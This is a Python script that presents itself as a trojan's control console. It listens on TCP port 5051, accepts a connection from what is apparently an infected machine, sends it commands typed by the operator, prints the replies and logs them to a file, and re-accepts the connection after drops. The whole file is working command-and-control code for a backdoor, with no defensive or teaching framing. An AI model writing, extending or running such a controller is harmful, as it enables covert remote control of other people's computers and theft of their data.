import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = get_local_ip()
PORT = 5051
SERVER = (HOST, PORT)
FORMAT = "utf-8"
BUFFER = 1024
DC_MSG = "!dc"

print("#"*32)
print("###### Welcome to trojan! ###### ")
print("#"*32)

s.bind(SERVER)
s.listen()
client, addr = s.accept()
print("Connected from: ", addr)

logs = open("./logs.log", "a")
run = True
while run:
    try:
        cmd = ""
        while cmd == "":
            cmd = input(">>> ")

        client.send(cmd.encode(FORMAT))

        if cmd == DC_MSG:
            print("Disconnected...")
            logs.close()
            run = False
            break
        if cmd == "\n": 
            continue
        msg = client.recv(BUFFER).decode(FORMAT)
        print(msg)
        msg += "\n"
        logs.write(msg)
    except KeyboardInterrupt:
        print("\nDisconnected...")
        logs.close()
        run = False
    except:
        print("Client lost... reconnected")
        client, addr = s.accept()
        print("Connected from: ", addr)
